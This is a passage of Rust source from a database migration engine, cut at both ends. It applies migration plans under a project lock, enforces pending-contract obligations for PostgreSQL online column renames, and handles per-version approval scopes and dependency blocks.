    /// the dependent plan touches a DIFFERENT table than the pending one (the case
    /// the touched-table refusal does not cover). The step-derived `Migration`
    /// `depends_on` (e.g. the EXPAND chain's interior edges) is UNIONed in
    /// regardless, so a caller that passes an empty `depends_on` slice still gets
    /// step-level coverage.
    ///
    /// # Errors
    /// Same as [`apply_plan_with_touched`](Self::apply_plan_with_touched), plus
    /// [`EngineError::DependencyPendingContract`] (wrapped in
    /// [`DeclarativeApplyError::Plain`]) when a `depends_on` references an
    /// outstanding obligation's `plan_version`.
    #[allow(clippy::too_many_arguments)]
    pub async fn apply_plan_with_touched_and_depends<B: MigrationBackend>(
        &self,
        steps: &[PlanStep],
        touched_tables: &[String],
        depends_on: &[String],
        approval: Approval,
        backend: &B,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
        lock_mode: LockMode,
    ) -> Result<DeclarativeDeployOutcome, DeclarativeApplyError> {
        self.apply_plan_with_touched_and_depends_scoped(
            steps,
            touched_tables,
            depends_on,
            approval,
            &crate::approval::ApprovalScope::All,
            backend,
            exec_cfg,
            applied_by,
            lock_mode,
            // No deploy recovery scope on the routine (non-deploy-handler) wrapper —
            // identical to a non-deploy apply (PR9e R2 fail-closed default: `None` ⇒
            // no marker written).
            None,
        )
        .await
    }

    /// **PR9b** — as
    /// [`apply_plan_with_touched_and_depends`](Self::apply_plan_with_touched_and_depends),
    /// but ALSO threads a per-version [`ApprovalScope`](crate::ApprovalScope) so the
    /// out-of-band approved IR-deploy path can fail-closed REFUSE a destructive op
    /// whose version-id the operator did not individually review — even under
    /// [`Approval::Approved`]. Existing callers' signatures are unchanged: they route
    /// through the non-`_scoped` wrapper which passes
    /// [`ApprovalScope::All`](crate::ApprovalScope::All) (byte-identical blanket
    /// behavior). Only the deploy-IR scoped surface opts in.
    ///
    /// # Errors
    /// Same as
    /// [`apply_plan_with_touched_and_depends`](Self::apply_plan_with_touched_and_depends),
    /// plus [`EngineError::ApprovalNotScoped`] (wrapped in
    /// [`DeclarativeApplyError::Plain`]) when a destructive step's version is outside
    /// the scope.
    #[allow(clippy::too_many_arguments)]
    pub async fn apply_plan_with_touched_and_depends_scoped<B: MigrationBackend>(
        &self,
        steps: &[PlanStep],
        touched_tables: &[String],
        depends_on: &[String],
        approval: Approval,
        scope: &crate::approval::ApprovalScope,
        backend: &B,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
        lock_mode: LockMode,
        recovery_scope: Option<&crate::apply::journal::DeployRecoveryScope<'_>>,
    ) -> Result<DeclarativeDeployOutcome, DeclarativeApplyError> {
        self.apply_plan_resolving(
            steps,
            touched_tables,
            depends_on,
            &[],
            approval,
            scope,
            backend,
            exec_cfg,
            applied_by,
            lock_mode,
            recovery_scope,
        )
        .await
    }

    /// As [`apply_plan_with_touched`](Self::apply_plan_with_touched), but with an
    /// EXPLICIT obligation-resolution list (§2.0.3 the `resolve-pending` path). Each
    /// `(pc, resolution)` names an outstanding obligation this plan is RESOLVING:
    ///
    /// - its table is EXEMPTED from the touched-table refusal (these drops ARE the
    ///   resolution of that obligation, not a new op fighting it);
    /// - on SUCCESS only, the obligation is discharged by APPENDING a `resolved`
    ///   row with the supplied [`Resolution`](crate::apply::journal::Resolution)
    ///   (`applied`/`aborted`) — fail-closed: an apply failure leaves the
    ///   obligation OUTSTANDING (never resolved-but-not-applied).
    ///
    /// The resolve runs inside the SAME held project lock as the apply, so it is
    /// race-free against concurrent deploys.
    ///
    /// `depends_on` carries the artifact's plan-level dependency versions for the
    /// §2.0.4 cross-plan block (see
    /// [`apply_plan_with_touched_and_depends`](Self::apply_plan_with_touched_and_depends)).
    ///
    /// `scope` is the PR9b per-version [`ApprovalScope`](crate::ApprovalScope): every
    /// destructive step (DDL drop/truncate/lossy, destructive DML, SQLite rebuild, PG
    /// online-rename EXPAND backfill) is admitted only if `scope.admits(version)`.
    /// Existing callers pass [`ApprovalScope::All`](crate::ApprovalScope::All) for
    /// byte-identical blanket behavior; the out-of-band approved IR-deploy surface
    /// passes [`ApprovalScope::Versions`](crate::ApprovalScope::Versions).
    ///
    /// # Errors
    /// Same as [`apply_plan_with_touched`](Self::apply_plan_with_touched), plus
    /// [`EngineError::DependencyPendingContract`] when a `depends_on` references an
    /// outstanding obligation's `plan_version`, plus
    /// [`EngineError::ApprovalNotScoped`] when a destructive step's version is outside
    /// `scope`.
    #[allow(clippy::too_many_arguments)]
    pub async fn apply_plan_resolving<B: MigrationBackend>(
        &self,
        steps: &[PlanStep],
        touched_tables: &[String],
        depends_on: &[String],
        resolve: &[(crate::apply::journal::PendingContract, crate::apply::journal::Resolution)],
        approval: Approval,
        scope: &crate::approval::ApprovalScope,
        backend: &B,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
        lock_mode: LockMode,
        // PR9e — the deploy-scoped recovery scope. When `Some`, every EXPAND this plan
        // opens writes its `in_progress` recovery marker in the SAME transaction as
        // the obligation row (engine-stamped, atomic). `None` for routine (`.sql` /
        // resolve / abort) callers that carry no deploy recovery scope.
        recovery_scope: Option<&crate::apply::journal::DeployRecoveryScope<'_>>,
    ) -> Result<DeclarativeDeployOutcome, DeclarativeApplyError> {
        // **Whole-plan project-lock acquisition (§2.0.3(1)).** When the caller asks
        // us to `Acquire`, take the project advisory lock ONCE up front for the
        // ENTIRE plan and thread `AlreadyHeld` into every sub-step — regardless of
        // which step kind comes first. The pre-PR0 declarative path relied on the
        // first DDL batch's `apply_with_lock_backend` to acquire, but a standalone
        // plan whose first step is `Dml`/`Backfill` would then run with NO project
        // lock ever taken (the data seams take only a per-batch xact lock, not the
        // session-scoped project lock), silently violating the "lock held across the
        // ENTIRE deploy" invariant. Acquiring here closes that hole for every plan
        // shape. Under `AlreadyHeld` (the declarative path) the outer caller owns the
        // lock and we acquire/release nothing.
        let we_hold_lock = lock_mode == LockMode::Acquire;
        if we_hold_lock {
            backend
                .acquire_project_lock(exec_cfg)
                .await
                .map_err(EngineError::Apply)?;
        }
        // Run the plan body in a helper so we can release the lock we acquired on
        // EVERY exit path (success or error) before returning.
        let result = self
            .apply_plan_locked(
                steps, touched_tables, depends_on, resolve, approval, scope, backend, exec_cfg,
                applied_by, recovery_scope,
            )
            .await;
        if we_hold_lock {
            // Release the lock we own, surfacing the body's error first. The lock
            // auto-releases on session end regardless, so a release failure after a
            // body error is not masked-but-lost data; we still log it.
            let unlock = backend.release_project_lock(exec_cfg).await;
            return match result {
                Ok(o) => unlock.map(|()| o).map_err(|e| {
                    DeclarativeApplyError::Plain(EngineError::Apply(e))
                }),
                Err(e) => Err(e),
            };
        }
        result
    }

    /// PR9d MED — abort the same-deploy online-rename EXPANDs of a deploy whose
    /// LATER file failed at apply, so a refused multi-file bundle leaves NO
    /// half-renamed table.
    ///
    /// For each obligation in `obligations` that is STILL outstanding (read back
    /// under the held lock — so an obligation already discharged by an earlier resume
    /// attempt is skipped, making this idempotent on crash-resume), re-author the
    /// SHARED abort DDL ([`crate::apply::backend::postgres::online::build_abort_steps`]: C1 drop
    /// trigger+fn, then `DROP COLUMN IF EXISTS <to>` — both idempotent) and run it
    /// through [`apply_plan_resolving`](Self::apply_plan_resolving), EXEMPTING the
    /// obligation from the touched-table refusal (its drops ARE its resolution) and
    /// APPENDING a `resolved='aborted'` row only on apply success (resolve-after-apply
    /// inside the held lock is fail-closed). The pre-rename `from` column is left
    /// intact.
    ///
    /// `lock_mode` is [`LockMode::AlreadyHeld`] when the control loop already owns the
    /// whole-deploy project lock (the in-process leg) and [`LockMode::Acquire`] when a
    /// standalone caller drives recovery.
    ///
    /// Returns the obligations it SUCCESSFULLY aborted. An abort-DDL failure (the DB
    /// went unreachable mid-recovery) surfaces as `Err`: the obligation stays
    /// outstanding + its recovery marker stays net-`in_progress`, so the NEXT same-app deploy
    /// re-attempts the abort under the lock (the documented irreducible residue the
    /// operator can also clear with `resolve-pending`). Fail-closed: never a silent
    /// fail-open.
    ///
    /// # Errors
    /// [`DeclarativeApplyError`] from the abort apply (a DB error, or a re-author
    /// failure surfaced as [`EngineError`]).
    ///
    /// Online-rename obligations exist only on the PG online path (SQLite has no
    /// online path — `online() == None`), and this re-authors the abort DDL via
    /// the PG-only `build_abort_steps`, so it rides `native-pg`.
    #[cfg(feature = "native-pg")]
    pub async fn abort_same_deploy_expands<B: MigrationBackend>(
        &self,
        obligations: &[crate::apply::journal::PendingContract],
        backend: &B,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
        lock_mode: LockMode,
    ) -> Result<Vec<crate::apply::journal::PendingContract>, DeclarativeApplyError> {
        if obligations.is_empty() {
            return Ok(Vec::new());
        }
        // Re-read the CURRENT outstanding set so a crash-resume that already aborted
        // some obligations does not re-drive them (idempotent). Under the held lock
        // (the in-process leg) this is consistent; on the standalone `Acquire` leg
        // `apply_plan_resolving` takes the lock per obligation below.
        let Some(pending_contracts) = backend.pending_contracts() else {
            return Ok(Vec::new());
        };
        let outstanding = pending_contracts
            .outstanding_pending_contracts(exec_cfg)
            .await
            .map_err(|e| {
                DeclarativeApplyError::Plain(EngineError::Apply(ApplyError::Journal(e)))
            })?;
        let still_outstanding: std::collections::BTreeSet<&str> = outstanding
            .iter()
            .map(|pc| pc.pending_version.as_str())
            .collect();

        let mut aborted: Vec<crate::apply::journal::PendingContract> = Vec::new();
        for pc in obligations {
            if !still_outstanding.contains(pc.pending_version.as_str()) {
                // Already discharged (a prior resume attempt aborted it, or a go-live
                // applied it) — nothing to do. Idempotent.
                continue;
            }
            let steps = crate::apply::backend::postgres::online::build_abort_steps(
                &exec_cfg.project_schema,
                pc,
            )
                .map_err(|e| {
                    DeclarativeApplyError::Plain(EngineError::Apply(ApplyError::Backend(
                        format!("re-author same-deploy abort: {e}"),
                    )))
                })?;
            // The obligation is passed as the explicit-resolve so it is EXEMPTED from
            // the touched-table refusal (its drops ARE its resolution) and APPENDED a
            // `resolved='aborted'` row only on apply success. Blanket scope: an abort
            // is the operator/recovery discharge of an already-opened obligation, not a
            // co-bundled reviewed version set.
            self.apply_plan_resolving(
                &steps,
                &[],
                &[],
                std::slice::from_ref(&(pc.clone(), crate::apply::journal::Resolution::Aborted)),
                Approval::Approved,
                &crate::approval::ApprovalScope::All,
                backend,
                exec_cfg,
                applied_by,
                lock_mode,
                // An abort opens no new obligation (it discharges one), so no recovery
                // marker is written here.
                None,
            )
            .await?;
            aborted.push(pc.clone());
        }
        Ok(aborted)
    }

    /// The plan body, run with the project lock already held (either because the
    /// outer declarative caller owns it, or because [`apply_plan`](Self::apply_plan)
    /// acquired it up front for an `Acquire`-mode standalone call). Every sub-step
    /// therefore runs with [`LockMode::AlreadyHeld`].
    #[allow(clippy::too_many_arguments)]
    async fn apply_plan_locked<B: MigrationBackend>(
        &self,
        steps: &[PlanStep],
        touched_tables: &[String],
        depends_on: &[String],
        explicit_resolve: &[(crate::apply::journal::PendingContract, crate::apply::journal::Resolution)],
        approval: Approval,
        scope: &crate::approval::ApprovalScope,
        backend: &B,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
        recovery_scope: Option<&crate::apply::journal::DeployRecoveryScope<'_>>,
    ) -> Result<DeclarativeDeployOutcome, DeclarativeApplyError> {
        // **Bootstrap the journal up front (§2.0.1).** The journal is the
        // net-applied ledger every sub-step reads (idempotency/net-applied-skip)
        // before it writes. The pre-PR0 declarative path always ran a DDL batch
        // first, whose `apply_with_lock_backend` → `apply_locked` bootstrapped the
        // journal via `ensure_journal`; but `apply_plan` is public API and a
        // standalone plan whose FIRST step is `Dml`/`Backfill`/`OnlineRename` would
        // otherwise make its first journal touch a READ (`backend.applied` /
        // `run_dml_step`'s net-applied lookup) against a non-existent journal table
        // → "relation does not exist". Bootstrapping here once, unconditionally,
        // restores the invariant that the journal is always materialized before any
        // step runs, for EVERY plan shape and BOTH backends (PG meta schema +
        // SQLite `_mig`). `ensure_journal` is idempotent (`CREATE … IF NOT EXISTS`),
        // so on the Ddl-first/declarative path — where the first DDL batch's
        // `apply_locked` also calls it — this is a harmless no-op (the golden trace
        // stays byte-identical).
        backend
            .ensure_journal(exec_cfg)
            .await
            .map_err(|e| EngineError::Apply(ApplyError::Journal(e)))?;

        // **§2.0.3 cross-deploy pending-contract READ-BACK + FAIL-CLOSED REFUSE.**
        //
        // The obligation table is bootstrapped (above), and the project advisory
        // lock is ALREADY HELD (acquired by `apply_plan` at `Acquire`, or owned by
        // the declarative caller) — so this read → act runs INSIDE the held lock
        // and is NOT a TOCTOU (§2.0.3 item 4 / §2.0.3.4): a concurrent deploy of
        // the same project blocks at the project lock acquire until we commit and
        // release, so it always observes the committed obligation set. We do NOT
        // add any finer-grained lock.
        //
        // SQLite returns an empty outstanding set unconditionally (no pending
        // partition, Deliverable 7), so this never false-gates a SQLite deploy.
        //
        // **L2 (PR9b) — SCOPE OF THIS READ-BACK: CROSS-deploy only.** This obligation
        // read-back is the CROSS-deploy snapshot — the set of obligations OUTSTANDING
        // from a PRIOR committed deploy, read once at the start of THIS deploy under
        // the held lock. An INTRA-deploy EXPAND-then-touch on the SAME table within ONE
        // deploy (a deploy whose own EXPAND opens an obligation that a LATER step in the
        // same deploy then touches) is intentionally OUT OF SCOPE here: it is covered by
        // the expand/contract gate (`check_expand_contract_gate`), which gates on the
        // journaled E-phase versions within the deploy. This read-back never re-reads
        // mid-loop, so an obligation opened by this deploy's own EXPAND is not in
        // `outstanding` and does not self-refuse (the §2.0.3 item-4 self-expand
        // exemption + the gate handle the intra-deploy case).
        //
        // **Fail closed on ANY doubt — EXCEPT this deploy IS the contract-apply.**
        // If any outstanding obligation's table is in this deploy's touched-set, the
        // deploy applies NOTHING and returns the structured
        // `TABLE_HAS_PENDING_CONTRACT` payload (§8.8) — UNLESS the deploy is the
        // legitimate contract-apply for that obligation (§2.0.2/§2.0.3.4): deploy
        // N+1 applies C1/C2 as `Ddl` steps to complete the rename. **PR9b L1** — we
        // recognize the contract-apply by RE-AUTHOR-COMPARE: the deploy's `Ddl` steps
        // must carry the obligation's recorded `contract_versions` AND match the
        // re-authored C1/C2 `up` SQL (not a version-id match alone — a forged plan
        // carrying the ids with innocuous SQL is NOT recognized and stays gated). Such
        // an obligation is DISCHARGED after the steps apply (a `resolved='applied'` row
        // appended, §2.0.3 item 1), not refused — applying the REAL contract is exactly
        // how the table becomes clear.
        let outstanding = if let Some(pending_contracts) = backend.pending_contracts() {
            pending_contracts
                .outstanding_pending_contracts(exec_cfg)
                .await
                .map_err(|e| EngineError::Apply(ApplyError::Journal(e)))?
        } else {
            Vec::new()
        };
        // **PR9b L1 — discharge hardening: re-author-compare, not version-id alone.**
        // The `up` SQL each `Ddl` step carries, keyed by version. The contract-apply
        // recognition below re-authors the obligation's C1/C2 from its stored identity
        // facts and requires the discharging Ddl steps to SEMANTICALLY MATCH (the
        // re-authored `up` SQL), not merely carry the recorded contract version-ids. A
        // forged plan that carries the obligation's `contract_versions` but innocuous
        // `up` SQL (a `SELECT 1` / a harmless `COMMENT ON`) therefore does NOT
        // discharge: the obligation stays outstanding, the dual-write trigger + `from`
        // column stay live, and the touched-table refusal still fires. Only a deploy
        // whose Ddl steps actually RUN the real C1 (drop trigger+fn) + C2 (drop column)
        // un-gates the table. The author's `up` text is byte-stable and independent of
        // `owner_app` (it names table/trigger/column only), so an exact string compare
        // is sound (it mirrors `command::runner`'s deterministic re-author).
        let ddl_up_by_version: std::collections::BTreeMap<&str, &str> = steps
            .iter()
            .filter_map(|s| match s {
                PlanStep::Ddl(m) => Some((m.version.as_str(), m.up.as_str())),
                _ => None,
            })
            .collect();
        // Re-author an outstanding obligation's contract C1/C2 and decide whether THIS
        // deploy's `Ddl` steps both carry the recorded `contract_versions` AND match
        // the re-authored contract `up` SQL for each. Fail-CLOSED: an empty
        // `contract_versions`, a missing matching Ddl step, an SQL mismatch, or an
        // author error all return `false` (NOT a contract-apply ⇒ the obligation is
        // NOT discharged and the table stays gated).
        let recognizes_contract_apply = |pc: &crate::apply::journal::PendingContract| -> bool {
            // PR9c: the recognizer is now the shared module-level
            // [`recognizes_contract_apply`] so the control-plane PRE-APPLY interlock
            // gate (`prevalidate_bundle_scope`) and this APPLY-time loop decide
            // "is this deploy the legitimate contract-apply?" by the SAME
            // re-author-compare — no drift between the bundle-level pre-check and
            // the per-file apply.
            recognizes_contract_apply(&exec_cfg.project_schema, pc, &ddl_up_by_version)
        };
        // The set of EXPAND trigger versions this plan RE-PRESENTS — a
        // `PgExpandContract` step whose `pending_version` matches an outstanding
        // obligation is the SAME rename re-running idempotently (deploy N retried,
        // §2.0.3 item 4), NOT a new op touching the pending table. Such a self
        // re-run must NOT be refused by its OWN obligation (the EXPAND
        // net-applied-skips and re-surfaces the same pending contract — a no-op).
        let self_expand_versions: std::collections::BTreeSet<&str> = steps
            .iter()
            .filter_map(|s| match s {
                PlanStep::OnlineRename(RenameStep::PgExpandContract(ec)) => {
                    Some(ec.trigger_version.as_str())
                }
                _ => None,
            })
            .collect();
        // Obligations this deploy DISCHARGES by applying their contract (all C1/C2
        // ids present among the Ddl steps). Resolved AFTER the step loop succeeds.
        let mut discharging: Vec<crate::apply::journal::PendingContract> = Vec::new();
        if !outstanding.is_empty() {
            // Union the caller-supplied op-list touched-set (IR path) with the
            // step-derived rename-intent tables, so a second renameColumn on the
            // pending table is caught even when the caller passes an empty slice.
            let mut touched: std::collections::BTreeSet<String> =
                touched_tables.iter().cloned().collect();
            touched.extend(crate::render::step::tables_touched_by(steps));
            // The lowering folds in [`TOUCHES_UNKNOWN`] when a `dropIndex` omits its
            // owning-table hint AND the live schema cannot resolve the index's owner
            // — meaning this deploy touches a table the lowering could not name. Fail
            // CLOSED: treat it as touching EVERY non-exempt outstanding obligation's
            // table, so a deploy carrying an unresolved drop is refused whenever ANY
            // obligation is outstanding rather than silently un-gated.
            let touches_unknown = touched.contains(TOUCHES_UNKNOWN);
            // Obligations the caller EXPLICITLY resolves this deploy (the
            // `resolve-pending` path): exempt from refusal, discharged with the
            // caller's resolution after the loop.
            let explicit_versions: std::collections::BTreeSet<&str> = explicit_resolve
                .iter()
                .map(|(pc, _)| pc.pending_version.as_str())
                .collect();
            for pc in &outstanding {
                // **PR9b L1** — recognized as a contract-apply ONLY if the discharging
                // Ddl steps both carry the recorded `contract_versions` AND match the
                // re-authored C1/C2 `up` SQL (re-author-compare, not version-id alone).
                let is_contract_apply = recognizes_contract_apply(pc);
                // **Exemption scope (LOW — table-wide, by design and bounded).** A
                // contract-apply deploy exempts the obligation's TABLE for the whole
                // deploy, so a bundle that carries C1/C2 AND an unrelated touching op
                // on the same table would apply both. This is NOT exploitable: the
                // exemption keys on the obligation's recorded `contract_versions`,
                // which are the rename's DETERMINISTIC, server-stamped C1/C2 ids
                // (§2.0.1) — a creator cannot forge them, and re-authoring the same
                // rename's contract IS the only legitimate way to discharge it
                // (§2.0.2). The accepted DX contract is therefore: a contract-apply
                // deploy SHOULD carry only the contract steps; co-bundling an
                // unrelated op on the same table is discouraged but bounded (it
                // applies under the SAME approval the destructive C2 already forces).
                if is_contract_apply {
                    discharging.push(pc.clone());
                    continue;
                }
                // The SAME rename re-running idempotently (deploy N retried) — its
                // EXPAND re-presents this obligation's `pending_version`. Not a new
                // op; the EXPAND net-applied-skips and re-surfaces the obligation.
                if self_expand_versions.contains(pc.pending_version.as_str()) {
                    continue;
                }
                // An obligation the caller is EXPLICITLY resolving — its drops ARE
                // the resolution, not a new op fighting it. Exempt from refusal.
                if explicit_versions.contains(pc.pending_version.as_str()) {
                    continue;
                }
                if touched.contains(&pc.table) || touches_unknown {
                    return Err(DeclarativeApplyError::Plain(EngineError::PendingContract(
                        crate::plan::pending::PendingContractRefusal::new(
                            pc.table.clone(),
                            pc.pending_version.clone(),
                        ),
                    )));
                }
            }

            // **§2.0.4 cross-plan `depends_on` BLOCK — fail-closed at APPLY, not
            // only in `status`.** A plan B with `depends_on: [A]` MUST NOT apply
            // while A's online-rename contract is still OUTSTANDING: A is not fully
            // satisfied (its C1/C2 are not net-applied), so B would run against a
            // half-applied A. This fires even when B touches a DIFFERENT table than
            // A's pending one — the case the touched-table refusal above does NOT
            // cover (the §2.0.4 "double-bind": when B *also* touches A's table both
            // refusals fire; when it touches a different table ONLY this one does).
            // Mirror `status::derive_pending_contract_status`: a `depends_on` edge
            // references the dependency's PLAN version (the rename's E1-anchored
            // plan-group id, the obligation's `plan_version`), NOT the interior E2
            // `pending_version`. The reported `pending_version` is the operator's
            // `resolve-pending` key.
            //
            // The `depends_on` set is the UNION of the caller-supplied plan-level
            // `depends_on` (the `.ir.json` `depends_on`, threaded via
            // `apply_plan_with_touched_and_depends`) and every step `Migration`'s
            // own `depends_on` (e.g. the EXPAND chain's interior edges), so the
            // block holds whether the dependency is declared at the artifact level
            // or carried on a step.
            //
            // EXEMPTIONS match the touched-table loop: a deploy that IS discharging
            // an obligation (contract-apply) or re-running its own EXPAND
            // (`self_expand`) or explicitly resolving it must NOT be blocked by
            // *that* obligation via a self-referential `depends_on` (applying the
            // contract is exactly how the dependency becomes satisfied). Such
            // obligations are keyed by `plan_version` here.
            // PR9b L1 — the contract-apply exemption here uses the SAME hardened
            // re-author-compare recognizer (not version-id alone), so a forged plan
            // carrying the contract version-ids with innocuous SQL is NOT exempted from
            // the §2.0.4 dependency block either.
            let exempt_plan_versions: std::collections::BTreeSet<&str> = outstanding
                .iter()
                .filter(|pc| {
                    recognizes_contract_apply(pc)
                        || self_expand_versions.contains(pc.pending_version.as_str())
                        || explicit_versions.contains(pc.pending_version.as_str())
                })
                .map(|pc| pc.plan_version.as_str())
                .collect();
            let mut declared_deps: std::collections::BTreeSet<&str> =
                depends_on.iter().map(String::as_str).collect();
            for s in steps {
                if let PlanStep::Ddl(m) = s {
                    declared_deps.extend(m.depends_on.iter().map(crate::model::migration::MigrationId::as_str));
                }
            }
            for pc in &outstanding {
                if exempt_plan_versions.contains(pc.plan_version.as_str()) {
                    continue;
                }
                if declared_deps.contains(pc.plan_version.as_str()) {
                    return Err(DeclarativeApplyError::Plain(
                        EngineError::DependencyPendingContract(
                            crate::plan::pending::DependencyPendingContract::new(
                                // The blocked plan's identity: the outer plan-group
                                // version if the steps carry one, else the deploy
                                // actor — best-effort identity for the payload, the
                                // refusal itself keys only on the dependency edge.
                                steps
                                    .iter()
                                    .find_map(|s| match s {
                                        PlanStep::Ddl(m) => Some(m.version.as_str().to_string()),
                                        _ => None,
                                    })
                                    .unwrap_or_else(|| applied_by.to_string()),
                                pc.plan_version.clone(),
                                pc.pending_version.clone(),
                            ),
                        ),
                    ));
                }
            }
        }

        let mut applied = ApplyOutcome {
            applied: Vec::new(),
            skipped: Vec::new(),
            recovered: Vec::new(),
        };
        let mut pending_contract: Vec<Migration> = Vec::new();
        // PR9d MED — the FULL obligation descriptors this plan freshly opened, handed
        // back so the control loop can drive the same-deploy abort over exactly these.
        let mut opened_obligations: Vec<crate::apply::journal::PendingContract> = Vec::new();
        // Pending versions this loop has ALREADY recorded a `pending` row for, so a
        // second `PgExpandContract` step in the SAME deploy sharing the same
        // deterministic `pending_version` does NOT append a duplicate `pending` row
        // (LOW). `outstanding_pending_contracts` collapses by pending_version
        // (DISTINCT ON), so net state was always correct; this keeps the append-only
        // history clean too.
        let mut recorded_this_deploy: std::collections::BTreeSet<String> =
            std::collections::BTreeSet::new();
        // The project lock is held for the whole plan (acquired by `apply_plan` or
        // owned by the outer declarative caller), so every sub-batch re-enters it
        // with `AlreadyHeld` — never re-acquiring (which would pop a re-entrant level
        // on release and free the lock between sub-batches).
        let next_lock = LockMode::AlreadyHeld;

        // Net-applied journal state for the rebuild net-applied-skip — read lazily
        // on the first rebuild step (avoids an extra journal read on the common
        // no-rebuild PG path; matches the pre-PR0 behavior which read `applied`
        // only when `plan.rebuilds` was non-empty).
        let mut rebuild_already: Option<std::collections::HashSet<String>> = None;

        let mut i = 0usize;
        while i < steps.len() {
            match &steps[i] {
                PlanStep::Ddl(_) => {
                    // Coalesce the maximal run of consecutive Ddl steps into one
                    // batch (byte-identical to the declarative plain-set apply).
                    let start = i;
                    while i < steps.len() && matches!(steps[i], PlanStep::Ddl(_)) {
                        i += 1;
                    }
                    let batch: Vec<Migration> = steps[start..i]
                        .iter()
                        .map(|s| match s {
                            PlanStep::Ddl(m) => m.clone(),
                            _ => unreachable!("coalesced run is all Ddl"),
                        })
                        .collect();
                    let outcome = crate::apply::executor::apply_with_lock_backend(
                        backend, exec_cfg, &batch, approval, scope, applied_by, next_lock,
                    )
                    .await
                    .map_err(EngineError::Apply)?;
                    applied.applied.extend(outcome.applied);
                    applied.skipped.extend(outcome.skipped);
                    applied.recovered.extend(outcome.recovered);
                }
                PlanStep::OnlineRename(RenameStep::SqliteRebuild(rebuild)) => {
                    // Re-expresses the declarative `plan.rebuilds` loop
                    // (`engine.rs:491-503`): approval gate + net-applied-skip +
                    // `rebuild_one`.
                    if approval != Approval::Approved {
                        return Err(DeclarativeApplyError::Plain(
                            EngineError::ApprovalRequired,
                        ));
                    }
                    // Read the net-applied set FIRST, so an already-applied rebuild
                    // idempotently no-ops BEFORE the scope gate (PR9b LOW fix): an
                    // idempotent re-deploy of an already-applied rebuild under a
                    // `Versions` scope that omits it must skip as a no-op, never be
                    // refused — the scope only ever gates work that would actually run.
                    if rebuild_already.is_none() {
                        rebuild_already = Some(
                            backend
                                .applied(exec_cfg)
                                .await
                                .map_err(|e| EngineError::Apply(ApplyError::Journal(e)))?
                                .into_iter()
                                .filter(|e| matches!(e.phase, crate::apply::journal::Phase::Completed))
                                .map(|e| e.version)
                                .collect(),
                        );
                    }
                    let version = rebuild.migration.version.as_str().to_string();
                    if rebuild_already
                        .as_ref()
                        .is_some_and(|set| set.contains(&version))
                    {
                        applied.skipped.push(version);
                        i += 1;
                        continue;
                    }
                    // **PR9b per-version scope (anti-bypass).** A SQLite rebuild on a
                    // populated table is destructive (it drops + recreates + copies),
                    // so under `ApprovalScope::Versions` it runs ONLY if the operator
                    // individually reviewed THIS rebuild's version. The scope version
                    // comes from the SINGLE source of truth
                    // [`PlanStep::approval_scope_version`] (which returns the rebuild
                    // version iff `rb.migration.flags.destructive`) so the gate and the
                    // reviewer-facing "what needs approval" list never drift. Under
                    // `ApprovalScope::All` (every existing caller) this is vacuously
                    // true. Fail-closed: an un-scoped rebuild applies nothing. The
                    // executor seam (`rebuild_one`) re-checks this as defense in depth.
                    if let Some(v) = steps[i].approval_scope_version() {
                        if !scope.admits(v) {
                            return Err(DeclarativeApplyError::Plain(
                                EngineError::ApprovalNotScoped { version: v.to_string() },
                            ));
                        }
                    }
                    backend
                        .rebuild_one(&rebuild.spec, &rebuild.migration, scope, applied_by)
                        .await
                        .map_err(EngineError::Apply)?;
                    applied.applied.push(version);
                    i += 1;
                }
                PlanStep::OnlineRename(RenameStep::PgExpandContract(rename)) => {
                    // Re-expresses the declarative online drive
                    // (`engine.rs:533-552`): run EXPAND+backfill atomically under
                    // the held lock, defer C1/C2 as `pending_contract` (§2.0.2).
                    let Some(online) = backend.online() else {
                        return Err(DeclarativeApplyError::Plain(EngineError::Apply(
                            ApplyError::Backend(
                                "plan carries a PG online rename but the backend has no \
                                 online schema-change capability (a SQLite rename must be a \
                                 RenameStep::SqliteRebuild; a PgExpandContract here is a \
                                 routing bug)"
                                    .to_string(),
                            ),
                        )));
                    };
                    // **PR9b per-version scope (anti-bypass).** A PG online rename's
                    // EXPAND mutates data (the dual-write backfill mirrors every
                    // pre-existing row into the new column), so it is an
                    // approval-gated op (`run_expand_pg` already requires
                    // `Approval::Approved`). Under `ApprovalScope::Versions` it runs
                    // ONLY if the operator individually reviewed THIS rename — keyed on
                    // the rename's PLAN-GROUP version (E1's deterministic id, the same
                    // anchor the obligation's `plan_version` records and the operator
                    // reviews), falling back to the E2 `trigger_version` if the expand
                    // chain is somehow empty (an internal invariant violation). Under
                    // `ApprovalScope::All` (every existing caller) this is vacuously
                    // true. Fail-closed: an un-scoped rename's EXPAND mirrors no data.
                    // The scope version comes from the SINGLE source of truth
                    // [`PlanStep::approval_scope_version`] so the gate and the
                    // reviewer-facing "what needs approval" list never drift.
                    if let Some(v) = steps[i].approval_scope_version() {
                        if !scope.admits(v) {
                            return Err(DeclarativeApplyError::Plain(
                                EngineError::ApprovalNotScoped { version: v.to_string() },
                            ));
                        }
                    }
                    let outcome = online
                        .run_online(
                            &rename.intent,
                            &rename.expand,
                            &rename.backfill,
                            approval,
                            scope,
                            // PR9c LOW (i): thread the E2 `trigger_version` so the
                            // executor-layer scope gate resolves its key UNCONDITIONALLY
                            // (E1 else `trigger_version`) — an empty expand chain no
                            // longer falls open.
                            &rename.trigger_version,
                            exec_cfg,
                            applied_by,
                            LockMode::AlreadyHeld,
                        )
                        .await?;
                    applied.applied.extend(outcome.applied);
                    applied.skipped.extend(outcome.skipped);
                    applied.recovered.extend(outcome.recovered);
                    pending_contract.extend(rename.contract.iter().cloned());

                    // **§2.0.3 item 1 — write the DURABLE pending-contract
                    // obligation.** The transient `pending_contract` return value is
                    // back-compat shape; the obligation table is now the SOURCE OF
                    // TRUTH for the cross-deploy interlock — it survives process
                    // restart and is read back by a later deploy.
                    //
                    // **Idempotent (Deliverable 5).** Keyed by `pending_version` (the
                    // E2 trigger id, deterministic per intent). If it is ALREADY in
                    // the outstanding set we read at the top of this function (under
                    // the held lock, so race-free), an idempotent re-run of deploy N
                    // — where the EXPAND net-applied-skipped — does NOT append a
                    // duplicate `pending` row, yet the obligation stays outstanding.
                    //
                    // The `pending_version` and the `RenameColumn` identity facts come
                    // straight from the lowered rename (`trigger_version` is the E2
                    // id; the intent carries table/from/to/ty). Admin-written via the
                    // backend (the migrator has no meta-schema grant) so a creator
                    // migration cannot forge or suppress it.
                    let crate::render::expand_contract::OnlineIntent::RenameColumn {
